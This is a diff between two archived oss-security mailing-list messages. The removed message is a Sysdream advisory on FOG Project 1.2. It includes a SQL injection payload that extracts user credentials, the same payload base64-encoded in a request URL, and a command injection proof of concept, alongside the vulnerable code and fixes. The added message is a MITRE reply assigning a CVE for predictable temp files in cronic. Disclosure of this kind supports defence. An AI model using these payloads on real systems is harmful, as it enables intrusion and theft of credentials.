@@ -1,149 +1,48 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/07/19/5
-Message-ID: <32be31eb-ce40-c3d5-db44-39b4bc8e84e6@sysdream.com>
-Date: Tue, 19 Jul 2016 11:12:32 +0200
-From: Sysdream Labs <labs@...dream.com>
-To: fulldisclosure@...lists.org, oss-security@...ts.openwall.com
-Subject: CVE ID Request: FOG Project Multiple Vulnerabilities
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/04/10/2
+Message-Id: <20160410142311.A459F336036@smtpvbsrv1.mitre.org>
+Date: Sun, 10 Apr 2016 10:23:11 -0400 (EDT)
+From: cve-assign@...re.org
+To: matthias@...lons.info
+Cc: cve-assign@...re.org, oss-security@...ts.openwall.com
+Subject: Re: CVE request: cronic - predictable temporary files
 Content-Type: text/plain; charset=utf-8
 
-# FOG Project Multiple Vulnerabilities
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA256
 
-## Description
+> https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=820331
+> 
+> very predictable temporary files (like
+> /tmp/cronic.out.$$) that depends only on PID:
 
-FOG is a free, open source, computer cloning and management solution.
+> OUT=/tmp/cronic.out.$$
+> ERR=/tmp/cronic.err.$$
+> TRACE=/tmp/cronic.trace.$$
 
-## SQL Injection
+> "$@" >$OUT 2>$TRACE
 
-The database functions located in the *FOGManagerController.class.php* file do not sanitize some parameters, which can input from unauthenticated users.
-Thus, an attacker without any privilege could execute arbitrary SQL commands and retrieve sensitive information from the database.
+Use CVE-2016-3992.
 
-**Access Vector**: remote
+- -- 
+CVE Assignment Team
+M/S M300, 202 Burlington Road, Bedford, MA 01730 USA
+[ A PGP key is available for encrypted communications at
+  http://cve.mitre.org/cve/request_id.html ]
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v1
 
-**Security Risk**: high
-
-**Vulnerability**: CWE-89
-
-**CVSS Base Score**: 9.3 (Critical)
-
-### Proof of Concept
-
-Payload:
-
-```
-' UNION ALL SELECT NULL,NULL,(SELECT GROUP_CONCAT(CONCAT_WS(':', uName, uPass)) FROM users),NULL,NULL-- -
-```
-
-Base64 Encoded :
-
-```
-https://fogserver/fog/service/updates.php?action=ask&file=JyBVTklPTiBBTEwgU0VMRUNUIE5VTEwsTlVMTCwoU0VMRUNUIEdST1VQX0NPTkNBVChDT05DQVRfV1MoJzonLCB1TmFtZSwgdVBhc3MpKSBGUk9NIHVzZXJzKSxOVUxMLE5VTEwtLSA=
-```
-
-### Vulnerable code
-
-The vulnerable code is located in *packages/web/lib/fog/FOGManagerController.class.php*, line 96, function *find()*:
-
-```
-if (is_array($value))
-      $whereArray[] = sprintf("`%s` IN ('%s')", $this->DB->sanitize($this->key($field)), implode("', '", $value));
-else
-      $whereArray[] = sprintf("`%s` %s '%s'", $this->DB->sanitize($this->key($field)), (preg_match('#%#', $value) ? 'LIKE' : '='), $value);
-```
-
-Note: *sanitize()* is applied on the database table field (not on the user-controlled value) and it does not filter back-quotes. As a consequence, this function is useless.
-
-Line 143, function *count()*:
-
-```
-if (is_array($value))
-        $whereArray[] = sprintf("`%s` IN ('%s')", $this->DB->sanitize($this->key($field)), implode("', '", $value));
-else
-        $whereArray[] = sprintf("`%s` %s '%s'", $this->DB->sanitize($this->key($field)), (preg_match('#%#', $value) ? 'LIKE' : '='), $value);
-```
-
-The vulnerable functions can be called in multiple files, without any authentication.
-
-File: *packages/web/service/updates.php*, line 14:
-
-```
-foreach($FOGCore->getClass('ClientUpdaterManager')->find(array('name' => base64_decode($_REQUEST['file']))) AS $ClientUpdate)
-```
-
-File *packages/web/service/servicemodule-active.php*, line 14:
-
-```
-$moduleID = current($FOGCore->getClass('ModuleManager')->find(array('shortName' => $_REQUEST['moduleid'])));
-```
-
-### Solution
-
-Sanitize every user-supplied input when passing it to SQL Queries.
-
-
-
-## Unauthenticated Remote Command Execution
-
-The *freespace.php* file does not correctly sanitize user-supplied *idnew* parameters. An unauthenticated attacker may use this file to execute system commands.
-
-**Access Vector**: remote
-
-**Security Risk**: high
-
-**Vulnerability**: CWE-88
-
-**CVSS Base Score**: 10 (Critical)
-
-### Proof of Concept
-
-```
-https://fogserver/status/freespace.php?idnew[path]=$(sleep%205)&idnew[id]=555&idnew[name]=SD&idnew[ip]=1234
-```
-
-### Vulnerable code
-
-The vulnerable code is located in *packages/web/status/freespace.php*, line 34:
-
-```
-$StorageNode = ($_REQUEST['idnew'] ? new StorageNode($_REQUEST['idnew']) : null);
-[...snip...]
-$t = shell_exec("df ".$StorageNode->get('path')."| grep -vE \"^Filesystem|shm\"");
-```
-
-### Solution
-
-Sanitize and verify every user-supplied input when passing it to shell_exec. Also, make sure only authenticated users can access this file.
-
-### Affected versions
-
-* FOG Stable <= 1.2
-
-## Solution
-
-Switch to beta/development builds.
-
-## Timeline (dd/mm/yyyy)
-
-* 05/04/2016 : Initial discovery
-* 06/07/2016 : Contact with vendor team with vulnerability description
-* 18/07/2016 : Remind vendor to get a reply
-* 19/07/2016 : Vendor acknowledges the report, saying that issues had been fixed a while ago in beta/development builds and that using 1.2.0 stable version is now discouraged.
-
-## Credits
-
-* Nicolas CHATELAIN, Sysdream (n.chatelain -at- sysdream -dot- com)
-* Gyver FERRAND, Sysdream (g.ferrand -at- sysdream -dot- com)
-
-
--- 
-SYSDREAM Labs <labs@...dream.com>
-
-GPG :
-47D1 E124 C43E F992 2A2E
-1551 8EB4 8CD9 D5B2 59A1
-
-* Website: https://sysdream.com/
-* Twitter: @sysdream
-
-
-Download attachment "signature.asc" of type "application/pgp-signature" (820 bytes)
+iQIcBAEBCAAGBQJXCl6/AAoJEL54rhJi8gl5nCsP/RzD+Emxt2vl9hJ9ihPhOKuV
+w3phB2guMZvZWQ0UFLQVzR7KfGQM84FLET9Fce0bW2Lb614U2XMjV+JXxQ/qklsg
+y6ZlJh+tSkQyuJWdIzmWt4kJWpPFqF3S3Lu06+yc7iTg/clIX9trjwDTGMTNDewJ
+F5qhrWDpAflz1KH6nmlbcRNsQC4fbJ0SUUCKOJEvAwIfn0x8fr9Z/iQGZ8odQ7rW
+uqE8NXh6ERPZkzu3hKLLGdbachECDMK5NPACUnKbjrUZu+rAjhupFuFS12vQyAA8
+oMAUZUApw7HT/34u2Wq+qijVnNjRKieOpuTdlksats9RB/smtm3JC4BTJVnpdm2E
+4LiuoEm8sQOP4kaaxOduC9+CQlqU9Z9ZFfq92w55KPqAYL/8lEbeES2OFSPZxUOC
+wGEaElcvbJQgATsm7P7tKknvCrl4onj4clI9ekbhf2ZRbLpM/VqH4Pp115cEH1ot
+CKAAiWOWSZwiSREyxSymyLbWhjm+8F2R83j1ArF6HGSBa1A/2WH4zJKXpa9QLPQ0
+7B3rO9SVQReg91FDwmIzOk5Ej6kKnBM7n5pi4EoIbLTOawQSWXPSdp+wy+VFN7qu
+NsfFrK28Q22TtatkR6KgjwIztC/fXVNiFomObYy0v2orIUesX3BPtKQzfEr5wlOD
+ZxbxbhEU0G3owq9goQo8
+=NKUf
+-----END PGP SIGNATURE-----
